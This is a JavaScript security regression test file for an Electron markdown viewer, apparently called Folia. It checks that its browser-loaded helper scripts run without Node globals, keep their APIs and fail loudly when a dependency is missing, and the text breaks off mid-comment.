// End-to-end security regression harness for the render pipeline.
// Run with: npm run test:security
//
// Boots the real main.js, then drives window.renderMarkdown() with the exact
// payloads from docs/SECURITY-AUDIT.md (SEC-01 through SEC-04) and asserts that none
// of them execute. Every attack test is paired with a feature test, because the
// remedy - making DOMPurify the last step in the pipeline instead of the third
// of nine - is exactly the kind of change that can silently stop mermaid,
// images or @@@html blocks from rendering at all.
//
// Payloads set window.__pwned rather than spawning a process. The property that
// matters is whether attacker-authored script runs in the Node-privileged
// renderer at all; what it would then choose to do is not in question.
const { app, BrowserWindow } = require("electron");
const fs = require("fs");
const path = require("path");
const vm = require("vm");

// Isolate this suite's userData profile before main.js exists and before the
// app is ready. See test-userdata-isolation.js.
require("./test-userdata-isolation");

const SEC08_LOADER_FOCUSED_HARNESS = process.env.SEC08_LOADER_FOCUSED_HARNESS === "1";
const SEC08_FILE_HELPERS_FOCUSED_HARNESS =
  process.env.SEC08_FILE_HELPERS_FOCUSED_HARNESS === "1";
const SEC08_FILE_HELPERS_PUBLICATION_HARNESS =
  process.env.SEC08_FILE_HELPERS_PUBLICATION_HARNESS === "1";
const SEC08_FILE_HELPERS_DOTFILE_HARNESS =
  process.env.SEC08_FILE_HELPERS_DOTFILE_HARNESS === "1";
const SEC08_FILE_HELPERS_MISSING_GLOBAL_HARNESS =
  process.env.SEC08_FILE_HELPERS_MISSING_GLOBAL_HARNESS === "1";
if (
  !SEC08_LOADER_FOCUSED_HARNESS &&
  !SEC08_FILE_HELPERS_FOCUSED_HARNESS &&
  !SEC08_FILE_HELPERS_PUBLICATION_HARNESS &&
  !SEC08_FILE_HELPERS_DOTFILE_HARNESS &&
  !SEC08_FILE_HELPERS_MISSING_GLOBAL_HARNESS
) {
  require("../src/main.js");
}

const dir = require("./test-visual-utils").tempDir("mdv-sec-");

const results = [];
const skipped = [];
function check(name, ok, detail) {
  results.push({ name, ok, detail });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${ok ? "" : "  -> " + detail}`);
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const {
  startErrorSentinel,
  proveSentinelAlive,
  captureScreenshot,
  trapExternalOpens,
  waitForExternalTrap,
} = require("./test-visual-utils");

// THE SUITE-LEVEL half of the renderer's state, extracted so that a document
// rebuilt mid-run is equivalent to the one the bootstrap established - not
// merely to the one the current section established.
//
// MEASURED, and the diagnosis it corrects was mine. n11EnsureAlive's recovery
// reload restored S12_INSTALL, N11_TRAP and the section's fixture, so the N11
// section itself ran to completion and its teardown passed. The suite then
// aborted 20 lines later, inside SEC-13, on `window.__e2eErrors.length = 0` -
// a global installed ONCE before run() and destroyed by the reload. It
// surfaced as `harness threw: Error: Script failed to execute` with no line
// information, and I twice attributed it to the N11 teardown's
// `__n11SavedExternal` restore by reading rather than by running. What settled
// it was hand-applying R463 and reading the suite's own PASS/FAIL stream: the
// last line before the throw is SEC-13's control assertion, and the teardown's
// own assertion passes above it.
//
// The accumulated entries are NOT recoverable across the reload - the document
// holding them is already gone when the recovery notices - so this reinstalls
// an EMPTY array. That is honest rather than lossy: every reader of the
// sentinel in this file clears it immediately before the action it describes
// (SEC-13:2313 and SEC-30 both do), so no assertion depends on entries
// recorded in an earlier section.
const E2E_SENTINEL = `
  window.__e2eErrors = [];
  window.addEventListener('error', e => window.__e2eErrors.push(String(e.message)));
  window.addEventListener('unhandledrejection', e => window.__e2eErrors.push(String(e.reason)));
  null;
`;

async function runUtilsLoaderProbe() {
  const commonJsUtils = require("../src/utils.js");
  check(
    "SEC-08 utils preserves its CommonJS API",
    commonJsUtils.removeBOM("\uFEFFloader") === "loader" &&
      commonJsUtils.getFileName("C:\\docs\\loader.md") === "loader.md" &&
      commonJsUtils.getDirectory("C:\\docs\\loader.md") === "C:/docs" &&
      commonJsUtils.escapeRegex("a+b?") === "a\\+b\\?" &&
      commonJsUtils.formatBytes(1536) === "1.5 KB",
    JSON.stringify(Object.keys(commonJsUtils).sort()),
  );

  const loaderWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  const sentinel = startErrorSentinel(loaderWin, { label: "sec08-utils-loader" });

  try {
    await loaderWin.loadFile(path.join(__dirname, "fixtures", "utils-loader.html"));
    const probe = await loaderWin.webContents.executeJavaScript(
      `(() => {
        const api = window.FoliaUtils;
        const terminal = document.getElementById("sec08-utils-loader-terminal");
        return {
          terminal: terminal && terminal.dataset.status,
          requireType: typeof window.require,
          moduleType: typeof window.module,
          processType: typeof window.process,
          apiType: typeof api,
          behavior: api && {
            removeBOM: api.removeBOM("\\uFEFFloader"),
            fileName: api.getFileName("C:\\\\docs\\\\loader.md"),
            directory: api.getDirectory("C:\\\\docs\\\\loader.md"),
            regex: api.escapeRegex("a+b?"),
            bytes: api.formatBytes(1536),
          },
        };
      })()`,
      true,
    );
    check(
      "SEC-08 classic utils script runs without Node globals",
      probe.requireType === "undefined" &&
        probe.moduleType === "undefined" &&
        probe.processType === "undefined",
      JSON.stringify(probe),
    );
    check(
      // This static document marker proves parsing completed independently of
      // FoliaUtils, so R680 can distinguish a missing API from a failed load.
      "SEC-08 loader document reaches its terminal DOM marker",
      probe.terminal === "parsed",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic utils script publishes representative FoliaUtils behavior",
      probe.apiType === "object" &&
        probe.behavior &&
        probe.behavior.removeBOM === "loader" &&
        probe.behavior.fileName === "loader.md" &&
        probe.behavior.directory === "C:/docs" &&
        probe.behavior.regex === "a\\+b\\?" &&
        probe.behavior.bytes === "1.5 KB",
      JSON.stringify(probe),
    );

    const alive = await proveSentinelAlive(loaderWin, sentinel);
    check(
      "SEC-08 loader error sentinel was demonstrably watching both channels",
      alive.console === true && alive.dom === true,
      JSON.stringify(alive),
    );
  } finally {
    const sentinelReport = await sentinel.stop();
    check(
      "SEC-08 loader fixture emits no unexpected errors",
      sentinelReport.hits.length === 0 && sentinelReport.stalls.length === 0,
      JSON.stringify(sentinelReport),
    );
    if (!loaderWin.isDestroyed()) loaderWin.destroy();
  }
}

async function runMermaidConfigLoaderProbe() {
  const commonJsMermaidConfig = require("../src/mermaid-config.js");
  const commonJsLight = commonJsMermaidConfig.getMermaidConfig(false);
  const commonJsDark = commonJsMermaidConfig.getMermaidConfig(true);
  const expectedKeys = [
    "MERMAID_DARK_THEME",
    "MERMAID_FLOWCHART",
    "MERMAID_FONT_PX",
    "MERMAID_LIGHT_THEME",
    "MERMAID_SEQUENCE",
    "getMermaidConfig",
  ];
  check(
    "SEC-08 mermaid-config preserves its CommonJS API",
    JSON.stringify(Object.keys(commonJsMermaidConfig).sort()) === JSON.stringify(expectedKeys) &&
      commonJsMermaidConfig.MERMAID_FONT_PX === 14 &&
      commonJsLight.theme === "default" &&
      commonJsDark.theme === "dark" &&
      commonJsLight.themeVariables.primaryColor === "#279EA7" &&
      commonJsDark.themeVariables.primaryColor === "#3DBDC6" &&
      commonJsLight.flowchart.padding === 6 &&
      commonJsDark.flowchart.rankSpacing === 38 &&
      commonJsLight.sequence.width === 118 &&
      commonJsDark.sequence.messageFontSize === 14,
    JSON.stringify({ keys: Object.keys(commonJsMermaidConfig).sort(), commonJsLight, commonJsDark }),
  );

  const loaderWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  const sentinel = startErrorSentinel(loaderWin, { label: "sec08-mermaid-loader" });

  try {
    await loaderWin.loadFile(path.join(__dirname, "fixtures", "mermaid-config-loader.html"));
    const probe = await loaderWin.webContents.executeJavaScript(
      `(() => {
        const api = window.FoliaMermaidConfig;
        const terminal = document.getElementById("sec08-mermaid-loader-terminal");
        const light = api && api.getMermaidConfig(false);
        const dark = api && api.getMermaidConfig(true);
        return {
          terminal: terminal && terminal.dataset.status,
          requireType: typeof window.require,
          moduleType: typeof window.module,
          processType: typeof window.process,
          apiType: typeof api,
          keys: api && Object.keys(api).sort(),
          fontPx: api && api.MERMAID_FONT_PX,
          light: light && {
            theme: light.theme,
            primaryColor: light.themeVariables.primaryColor,
            fontSize: light.themeVariables.fontSize,
            flowchartPadding: light.flowchart.padding,
            sequenceWidth: light.sequence.width,
          },
          dark: dark && {
            theme: dark.theme,
            primaryColor: dark.themeVariables.primaryColor,
            fontSize: dark.themeVariables.fontSize,
            flowchartRankSpacing: dark.flowchart.rankSpacing,
            sequenceMessageFontSize: dark.sequence.messageFontSize,
          },
        };
      })()`,
      true,
    );
    check(
      "SEC-08 classic mermaid-config script runs without Node globals",
      probe.requireType === "undefined" &&
        probe.moduleType === "undefined" &&
        probe.processType === "undefined",
      JSON.stringify(probe),
    );
    check(
      // This static document marker proves parsing completed independently of
      // FoliaMermaidConfig, so R683 can distinguish a missing API from a failed load.
      "SEC-08 mermaid loader document reaches its terminal DOM marker",
      probe.terminal === "parsed",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic mermaid-config script publishes representative FoliaMermaidConfig behavior",
      probe.apiType === "object" &&
        JSON.stringify(probe.keys) === JSON.stringify(expectedKeys) &&
        probe.fontPx === 14 &&
        probe.light &&
        probe.light.theme === "default" &&
        probe.light.primaryColor === "#279EA7" &&
        probe.light.fontSize === "14px" &&
        probe.light.flowchartPadding === 6 &&
        probe.light.sequenceWidth === 118 &&
        probe.dark &&
        probe.dark.theme === "dark" &&
        probe.dark.primaryColor === "#3DBDC6" &&
        probe.dark.fontSize === "14px" &&
        probe.dark.flowchartRankSpacing === 38 &&
        probe.dark.sequenceMessageFontSize === 14,
      JSON.stringify(probe),
    );

    const alive = await proveSentinelAlive(loaderWin, sentinel);
    check(
      "SEC-08 mermaid loader error sentinel was demonstrably watching both channels",
      alive.console === true && alive.dom === true,
      JSON.stringify(alive),
    );
  } finally {
    const sentinelReport = await sentinel.stop();
    check(
      "SEC-08 mermaid loader fixture emits no unexpected errors",
      sentinelReport.hits.length === 0 && sentinelReport.stalls.length === 0,
      JSON.stringify(sentinelReport),
    );
    if (!loaderWin.isDestroyed()) loaderWin.destroy();
  }
}

async function runContextMenuLoaderProbe() {
  const commonJsContextMenu = require("../src/context-menu-utils.js");
  check(
    "SEC-08 context-menu utilities preserve their CommonJS API",
    JSON.stringify(Object.keys(commonJsContextMenu).sort()) ===
      JSON.stringify(["hideContextMenu", "positionContextMenu"]) &&
      typeof commonJsContextMenu.positionContextMenu === "function" &&
      typeof commonJsContextMenu.hideContextMenu === "function",
    JSON.stringify(Object.keys(commonJsContextMenu).sort()),
  );

  const loaderWin = new BrowserWindow({
    show: false,
    width: 320,
    height: 240,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  const sentinel = startErrorSentinel(loaderWin, { label: "sec08-context-menu-loader" });

  try {
    await loaderWin.loadFile(path.join(__dirname, "fixtures", "context-menu-loader.html"));
    const probe = await loaderWin.webContents.executeJavaScript(
      `(() => {
        const api = window.FoliaContextMenu;
        const terminal = document.getElementById("sec08-context-menu-loader-terminal");
        const menu = document.getElementById("sec08-context-menu-loader-menu");
        const viewport = { width: window.innerWidth, height: window.innerHeight };
        api && api.positionContextMenu(menu, viewport.width - 1, viewport.height - 1);
        const shownRect = menu && menu.getBoundingClientRect();
        const shown = menu && {
          visible: menu.classList.contains("visible"),
          left: Number.parseFloat(menu.style.left),
          top: Number.parseFloat(menu.style.top),
          right: shownRect.right,
          bottom: shownRect.bottom,
          width: shownRect.width,
          height: shownRect.height,
        };
        api && api.hideContextMenu(menu);
        return {
          terminal: terminal && terminal.dataset.status,
          requireType: typeof window.require,
          moduleType: typeof window.module,
          processType: typeof window.process,
          apiType: typeof api,
          apiKeys: api && Object.keys(api).sort(),
          shown,
          hidden: menu && !menu.classList.contains("visible"),
          viewport,
        };
      })()`,
      true,
    );
    check(
      "SEC-08 classic context-menu script runs without Node globals",
      probe.requireType === "undefined" &&
        probe.moduleType === "undefined" &&
        probe.processType === "undefined",
      JSON.stringify(probe),
    );
    check(
      // This static document marker proves parsing completed independently of
      // FoliaContextMenu, so R687 can distinguish a missing API from a failed load.
      "SEC-08 context-menu loader document reaches its terminal DOM marker",
      probe.terminal === "parsed",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic context-menu script clamps, shows, and hides its menu",
      probe.apiType === "object" &&
        JSON.stringify(probe.apiKeys) ===
          JSON.stringify(["hideContextMenu", "positionContextMenu"]) &&
        probe.shown &&
        probe.shown.visible === true &&
        probe.shown.left === probe.viewport.width - probe.shown.width - 10 &&
        probe.shown.top === probe.viewport.height - probe.shown.height - 10 &&
        probe.shown.right <= probe.viewport.width - 10 &&
        probe.shown.bottom <= probe.viewport.height - 10 &&
        probe.hidden === true,
      JSON.stringify(probe),
    );

    const alive = await proveSentinelAlive(loaderWin, sentinel);
    check(
      "SEC-08 context-menu loader error sentinel was demonstrably watching both channels",
      alive.console === true && alive.dom === true,
      JSON.stringify(alive),
    );
  } finally {
    const sentinelReport = await sentinel.stop();
    check(
      "SEC-08 context-menu loader fixture emits no unexpected errors",
      sentinelReport.hits.length === 0 && sentinelReport.stalls.length === 0,
      JSON.stringify(sentinelReport),
    );
    if (!loaderWin.isDestroyed()) loaderWin.destroy();
  }
}

async function runEmojiLoaderProbe() {
  const commonJsEmojiMap = require("../src/emoji-map.js");
  const commonJsEmoji = require("../src/emoji-parser.js");
  const commonJsKnown = commonJsEmoji.parseEmojis("Known :star:");
  const commonJsUnknown = commonJsEmoji.parseEmojis("Unknown :notanemoji_xyz:");
  check(
    "SEC-08 emoji map and parser preserve their CommonJS behavior",
    commonJsEmojiMap.star === "\u2b50" &&
      JSON.stringify(Object.keys(commonJsEmoji).sort()) === JSON.stringify(["parseEmojis"]) &&
      commonJsKnown === "Known \u2b50" &&
      commonJsUnknown === "Unknown :notanemoji_xyz:",
    JSON.stringify({
      star: commonJsEmojiMap.star,
      keys: Object.keys(commonJsEmoji).sort(),
      commonJsKnown,
      commonJsUnknown,
    }),
  );

  const loaderWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  const sentinel = startErrorSentinel(loaderWin, { label: "sec08-emoji-loader" });

  try {
    await loaderWin.loadFile(path.join(__dirname, "fixtures", "emoji-loader.html"));
    const probe = await loaderWin.webContents.executeJavaScript(
      `(() => {
        const map = window.FoliaEmojiMap;
        const api = window.FoliaEmoji;
        const terminal = document.getElementById("sec08-emoji-loader-terminal");
        return {
          terminal: terminal && terminal.dataset.status,
          requireType: typeof window.require,
          moduleType: typeof window.module,
          processType: typeof window.process,
          mapType: typeof map,
          parserType: typeof api,
          mapStar: map && map.star,
          parserKeys: api && Object.keys(api).sort(),
          known: api && api.parseEmojis("Known :star:"),
          unknown: api && api.parseEmojis("Unknown :notanemoji_xyz:"),
        };
      })()`,
      true,
    );
    check(
      "SEC-08 classic emoji scripts run without Node globals",
      probe.requireType === "undefined" &&
        probe.moduleType === "undefined" &&
        probe.processType === "undefined",
      JSON.stringify(probe),
    );
    check(
      // This marker belongs to the static fixture, so it remains an
      // independent setup control when either classic script fails to load.
      "SEC-08 emoji loader document reaches its terminal DOM marker",
      probe.terminal === "parsed",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic emoji scripts publish FoliaEmojiMap and FoliaEmoji",
      probe.mapType === "object" &&
        probe.parserType === "object" &&
        probe.mapStar === "\u2b50" &&
        JSON.stringify(probe.parserKeys) === JSON.stringify(["parseEmojis"]),
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic emoji parser converts known shortcodes and preserves unknown shortcodes",
      probe.known === "Known \u2b50" && probe.unknown === "Unknown :notanemoji_xyz:",
      JSON.stringify(probe),
    );

    await sentinel.mute("missing FoliaEmojiMap must fail loudly");
    let missingMapSetup;
    let missingMapMute;
    try {
      missingMapSetup = await loaderWin.webContents.executeJavaScript(
        `new Promise((resolve) => {
          const savedMap = window.FoliaEmojiMap;
          delete window.FoliaEmojiMap;
          const script = document.createElement("script");
          script.src = "../../src/emoji-parser.js?sec08-missing-map=" + Date.now();
          const finish = (event) => {
            const mapWasAbsent = window.FoliaEmojiMap === undefined;
            window.FoliaEmojiMap = savedMap;
            script.remove();
            resolve({
              event,
              mapWasAbsent,
              mapRestored: window.FoliaEmojiMap === savedMap,
            });
          };
          script.addEventListener("load", () => finish("load"), { once: true });
          script.addEventListener("error", () => finish("error"), { once: true });
          document.head.appendChild(script);
        })`,
        true,
      );
      await sentinel.drain();
      missingMapMute = sentinel.currentMute();
    } finally {
      await sentinel.unmute();
    }
    const missingMapSuppressed = (missingMapMute && missingMapMute.suppressed) || [];
    check(
      "SEC-08 emoji missing-map probe removes and restores the browser map around a fresh parser load",
      missingMapSetup &&
        missingMapSetup.event === "load" &&
        missingMapSetup.mapWasAbsent === true &&
        missingMapSetup.mapRestored === true,
      JSON.stringify(missingMapSetup),
    );
    check(
      "SEC-08 emoji parser fails loudly when its browser map is absent",
      missingMapSuppressed.some(
        (entry) =>
          entry.kind === "console-error" &&
          entry.detail.includes("FoliaEmojiMap must load before emoji-parser.js"),
      ),
      JSON.stringify(missingMapSuppressed),
    );

    const alive = await proveSentinelAlive(loaderWin, sentinel);
    check(
      "SEC-08 emoji loader error sentinel was demonstrably watching both channels",
      alive.console === true && alive.dom === true,
      JSON.stringify(alive),
    );
  } finally {
    const sentinelReport = await sentinel.stop();
    check(
      "SEC-08 emoji loader fixture emits no unexpected errors",
      sentinelReport.hits.length === 0 && sentinelReport.stalls.length === 0,
      JSON.stringify(sentinelReport),
    );
    if (!loaderWin.isDestroyed()) loaderWin.destroy();
  }
}

const FILE_HELPER_EXTENSION_CASES = [
  "diagram.mmd",
  "diagram.MMD",
  "diagram.MeRmAiD",
  "diagram.mermaid",
  "document.md",
  "document.markdown",
  "document.mdown",
  "document.mkd",
  "document.mkdn",
  ".md",
  "..mmd",
  "C:.mmd",
  "diagram.mmd.",
  "diagram.mmd/",
  "diagram.mmd\\",
  "dir/diagram.mmd",
  "C:\\docs\\diagram.mmd",
  "C:\\docs\\.md",
  "dir.mmd\\plain",
  "...",
];

async function runFileHelpersLoaderProbe({
  includeCore = true,
  includeMissingGlobal = true,
  extensionCases = FILE_HELPER_EXTENSION_CASES,
} = {}) {
  if (includeCore) {
  const extensionCaseLabel =
    `${extensionCases.length} ${extensionCases.length === 1 ? "case" : "cases"}`;
  const commonJsCore = require("../src/file-helpers-core.js");
  const commonJsAdapter = require("../src/file-helpers.js");
  const expectedAdapterKeys = [
    "FENCED_LINE_DISCOUNT",
    "LARGE_DOC_BUDGET_MS",
    "MS_PER_UNIT",
    "SUPPORTED_EXTENSIONS",
    "estimateRenderMs",
    "estimateRenderUnits",
    "isLargeDocument",
    "isMarkdownFile",
    "isMermaidFile",
    "readMarkdownFile",
    "removeBOM",
    "sendIPCResult",
    "wrapMermaidContent",
  ];
  const adapterProbePath = path.join(dir, "file-helpers-loader.mmd");
  fs.writeFileSync(adapterProbePath, "\uFEFFgraph TD\n  A --> B\n", "utf8");
  let adapterRead;
  let adapterError;
  try {
    adapterRead = await new Promise((resolve) => {
      commonJsAdapter.readMarkdownFile(adapterProbePath, (error, content) =>
        resolve({ error, content }),
      );
    });
    adapterError = await new Promise((resolve) => {
      commonJsAdapter.readMarkdownFile(
        path.join(dir, "file-helpers-loader-missing.md"),
        (error, content) => resolve({ error, content }),
      );
    });
  } finally {
    fs.unlinkSync(adapterProbePath);
  }
  const sent = [];
  const webContents = {
    send(channel, payload) {
      sent.push({ channel, payload });
    },
  };
  commonJsAdapter.sendIPCResult(webContents, "file-helpers-success", true, { value: 1 });
  commonJsAdapter.sendIPCResult(webContents, "file-helpers-failure", false, { reason: "missing" });
  check(
    "SEC-08 file-helpers adapter preserves its CommonJS API, reader errors, and IPC payloads",
    JSON.stringify(Object.keys(commonJsAdapter).sort()) === JSON.stringify(expectedAdapterKeys) &&
      Object.keys(commonJsCore).every((key) => commonJsAdapter[key] === commonJsCore[key]) &&
      adapterRead.error === null &&
      adapterRead.content === "```mermaid\ngraph TD\n  A --> B\n\n```" &&
      adapterError.error &&
      adapterError.error.code === "ENOENT" &&
      adapterError.content === null &&
      JSON.stringify(sent) ===
        JSON.stringify([
          {
            channel: "file-helpers-success",
            payload: { success: true, value: 1 },
          },
          {
            channel: "file-helpers-failure",
            payload: { success: false, reason: "missing" },
          },
        ]),
    JSON.stringify({
      adapterKeys: Object.keys(commonJsAdapter).sort(),
      adapterRead: {
        code: adapterRead.error && adapterRead.error.code,
        content: adapterRead.content,
      },
      adapterError: {
        code: adapterError.error && adapterError.error.code,
        content: adapterError.content,
      },
      sent,
    }),
  );

  const coreSource = fs.readFileSync(path.join(__dirname, "..", "src", "file-helpers-core.js"), "utf8");
  const platformResults = ["win32", "linux"].map((platform) => {
    const module = { exports: {} };
    vm.runInNewContext(coreSource, {
      module,
      process: { platform },
    }, { filename: `file-helpers-core-${platform}.js` });
    const pathApi = platform === "win32" ? path.win32 : path.posix;
    return extensionCases.every((filePath) => {
      const extension = pathApi.extname(filePath).toLowerCase();
      return (
        module.exports.isMermaidFile(filePath) ===
          [".mmd", ".mermaid"].includes(extension) &&
        module.exports.isMarkdownFile(filePath) ===
          [".md", ".markdown", ".mdown", ".mkd", ".mkdn", ".mmd", ".mermaid"].includes(extension)
      );
    }) && (() => {
      try {
        module.exports.isMermaidFile(42);
        return false;
      } catch (error) {
        return error && error.name === "TypeError";
      }
    })();
  });
  check(
  `SEC-08 file-helpers core matches Node extname behavior on Windows and POSIX (${extensionCaseLabel})`,
    platformResults.every(Boolean),
    JSON.stringify({ extensionCases, platformResults }),
  );

  const loaderWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  const sentinel = startErrorSentinel(loaderWin, { label: "sec08-file-helpers-loader" });

  try {
    await loaderWin.loadFile(path.join(__dirname, "fixtures", "file-helpers-loader.html"));
    const probe = await loaderWin.webContents.executeJavaScript(
      `(() => {
        const api = window.FoliaFileHelpers;
        const terminal = document.getElementById("sec08-file-helpers-loader-terminal");
        const fence = String.fromCharCode(96).repeat(3);
        const sample = "# H\\n| a | b |\\n" + fence + "\\n| c | d |\\n" + fence + "\\n";
        const estimated = api && api.estimateRenderUnits(sample);
        const large = api && api.isLargeDocument(sample, 0);
        const cases = ${JSON.stringify(extensionCases)}.map((filePath) => ({
          filePath,
          mermaid: api && api.isMermaidFile(filePath),
          markdown: api && api.isMarkdownFile(filePath),
        }));
        return {
          terminal: terminal && terminal.dataset.status,
          requireType: typeof window.require,
          moduleType: typeof window.module,
          processType: typeof window.process,
          navigatorPlatform: navigator.platform,
          apiType: typeof api,
          bom: api && api.removeBOM("\\uFEFFloader"),
          mmd: api && api.wrapMermaidContent("graph TD", "diagram.mmd"),
          markdown: api && api.wrapMermaidContent("# Heading", "document.md"),
          fenced: api && api.wrapMermaidContent(fence + "mermaid\\ngraph TD\\n" + fence, "diagram.mmd"),
          constants: api && {
            msPerUnit: api.MS_PER_UNIT,
            fencedLineDiscount: api.FENCED_LINE_DISCOUNT,
            largeDocBudgetMs: api.LARGE_DOC_BUDGET_MS,
          },
          estimated,
          large,
          cases,
        };
      })()`,
      true,
    );
    const browserPath = probe.navigatorPlatform.startsWith("Win") ? path.win32 : path.posix;
    const expectedBrowserCases = extensionCases.map((filePath) => {
      const extension = browserPath.extname(filePath).toLowerCase();
      return {
        filePath,
        mermaid: [".mmd", ".mermaid"].includes(extension),
        markdown: [".md", ".markdown", ".mdown", ".mkd", ".mkdn", ".mmd", ".mermaid"].includes(extension),
      };
    });
    check(
      "SEC-08 classic file-helpers-core script runs without Node globals",
      probe.requireType === "undefined" &&
        probe.moduleType === "undefined" &&
        probe.processType === "undefined",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 file-helpers loader document reaches its terminal DOM marker",
      probe.terminal === "parsed",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic file-helpers-core script preserves BOM, Mermaid, and estimator behavior",
      probe.apiType === "object" &&
        probe.bom === "loader" &&
        probe.mmd === "```mermaid\ngraph TD\n```" &&
        probe.markdown === "# Heading" &&
        probe.fenced === "```mermaid\ngraph TD\n```" &&
        probe.constants &&
        probe.constants.msPerUnit === 0.047 &&
        probe.constants.fencedLineDiscount === 0.8 &&
        probe.constants.largeDocBudgetMs === 10000 &&
        JSON.stringify(probe.estimated) ===
          JSON.stringify({ units: 6.6, lines: 6, fencedLines: 3, pipes: 3 }) &&
        JSON.stringify(probe.large) ===
          JSON.stringify({ large: true, estimatedMs: 0.3102, units: 6.6 }),
      JSON.stringify(probe),
    );
    check(
      `SEC-08 classic file-helpers-core script follows its browser platform extension rules (${extensionCaseLabel})`,
      JSON.stringify(probe.cases) === JSON.stringify(expectedBrowserCases),
      JSON.stringify({ probe, expectedBrowserCases }),
    );

    const alive = await proveSentinelAlive(loaderWin, sentinel);
    check(
      "SEC-08 file-helpers loader error sentinel was demonstrably watching both channels",
      alive.console === true && alive.dom === true,
      JSON.stringify(alive),
    );
  } finally {
    const sentinelReport = await sentinel.stop();
    check(
      "SEC-08 file-helpers loader fixture emits no unexpected errors",
      sentinelReport.hits.length === 0 && sentinelReport.stalls.length === 0,
      JSON.stringify(sentinelReport),
    );
    if (!loaderWin.isDestroyed()) loaderWin.destroy();
  }
  }

  if (!includeMissingGlobal) return;

  const missingGlobalWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });
  const missingGlobalSentinel = startErrorSentinel(missingGlobalWin, {
    label: "sec08-file-helpers-missing-global",
  });
  try {
    await missingGlobalWin.loadFile(path.join(__dirname, "fixtures", "file-helpers-loader.html"));
    await missingGlobalSentinel.mute("missing FoliaFileHelpers must fail loudly");
    let missingGlobalSetup;
    let missingGlobalMute;
    try {
      missingGlobalSetup = await missingGlobalWin.webContents.executeJavaScript(
        `new Promise((resolve) => {
          const savedCore = window.FoliaFileHelpers;
          const savedMenu = window.FoliaContextMenu;
          window.FoliaContextMenu = {
            positionContextMenu() {},
            hideContextMenu() {},
          };
          delete window.FoliaFileHelpers;
          const script = document.createElement("script");
          script.src = "../../src/custom-tabs.js?sec08-missing-file-helpers=" + Date.now();
          const finish = (event) => {
            const coreWasAbsent = window.FoliaFileHelpers === undefined;
            window.FoliaFileHelpers = savedCore;
            if (savedMenu === undefined) delete window.FoliaContextMenu;
            else window.FoliaContextMenu = savedMenu;
            script.remove();
            resolve({
              event,
              coreWasAbsent,
              coreRestored: window.FoliaFileHelpers === savedCore,
            });
          };
          script.addEventListener("load", () => finish("load"), { once: true });
          script.addEventListener("error", () => finish("error"), { once: true });
          document.head.appendChild(script);
        })`,
        true,
      );
      await missingGlobalSentinel.drain();
      missingGlobalMute = missingGlobalSentinel.currentMute();
    } finally {
      await missingGlobalSentinel.unmute();
    }
    const missingGlobalSuppressed = (missingGlobalMute && missingGlobalMute.suppressed) || [];
    const missingCoreErrors = missingGlobalSuppressed.filter(
      (entry) =>
        entry.kind === "console-error" &&
        entry.detail.includes("FoliaFileHelpers must load before custom-tabs.js"),
    );
    check(
      "SEC-08 file-helpers missing-global probe removes and restores the browser core around a fresh custom-tabs load",
      missingGlobalSetup &&
        missingGlobalSetup.event === "load" &&
        missingGlobalSetup.coreWasAbsent === true &&
        missingGlobalSetup.coreRestored === true,
      JSON.stringify(missingGlobalSetup),
    );
    check(
      "SEC-08 custom-tabs fails loudly when its browser file-helpers core is absent",
      missingCoreErrors.length > 0,
      JSON.stringify(missingGlobalSuppressed),
    );
    check(
      "SEC-08 custom-tabs missing-global probe suppresses only the expected core error",
      missingCoreErrors.length > 0 &&
        missingCoreErrors.length === missingGlobalSuppressed.length,
      JSON.stringify(missingGlobalSuppressed),
    );
    const missingGlobalAlive = await proveSentinelAlive(missingGlobalWin, missingGlobalSentinel);
    check(
      "SEC-08 file-helpers missing-global sentinel was demonstrably watching both channels",
      missingGlobalAlive.console === true && missingGlobalAlive.dom === true,
      JSON.stringify(missingGlobalAlive),
    );
  } finally {
    const missingGlobalReport = await missingGlobalSentinel.stop();
    check(
      "SEC-08 file-helpers missing-global probe emits no unexpected errors",
      missingGlobalReport.hits.length === 0 && missingGlobalReport.stalls.length === 0,
      JSON.stringify(missingGlobalReport),
    );
    if (!missingGlobalWin.isDestroyed()) missingGlobalWin.destroy();
  }
}

async function runFileHelpersFocusedProbe() {
  const keepAliveWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  try {
    await runFileHelpersLoaderProbe();
  } finally {
    if (!keepAliveWin.isDestroyed()) keepAliveWin.destroy();
  }
}

async function runFocusedLoaderProbes() {
  // Without main.js, Electron exits as soon as a probe destroys its only
  // BrowserWindow. Keep this no-Node window alive until both independent
  // loader fixtures have completed.
  const keepAliveWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  try {
    await runUtilsLoaderProbe();
    await runMermaidConfigLoaderProbe();
    await runContextMenuLoaderProbe();
    await runEmojiLoaderProbe();
  } finally {
    if (!keepAliveWin.isDestroyed()) keepAliveWin.destroy();
  }
}

async function run(win) {
  // A MAIN-PROCESS property, asserted before any page state matters.
  //
  // Electron installs a default application menu - File/Edit/View/Window -
  // whenever nothing calls Menu.setApplicationMenu, and its View submenu
  // carries Toggle Developer Tools on Ctrl+Shift+I. The renderer here runs with
  // nodeIntegration: true, so that stock keystroke is a Node console with the
  // user's full filesystem rights in a shipped build: the "open this file,
  // press the shortcut, paste this" route, which needs no bug in Folia at all.
  //
  // MEASURED, with a positive control, because a bare "it did not open" would
  // have failed open: two identical windows were sent a synthesised
  // Ctrl+Shift+I, and the one WITHOUT setMenu(null) opened DevTools while the
  // one with it did not. So the per-window call is a security control and not
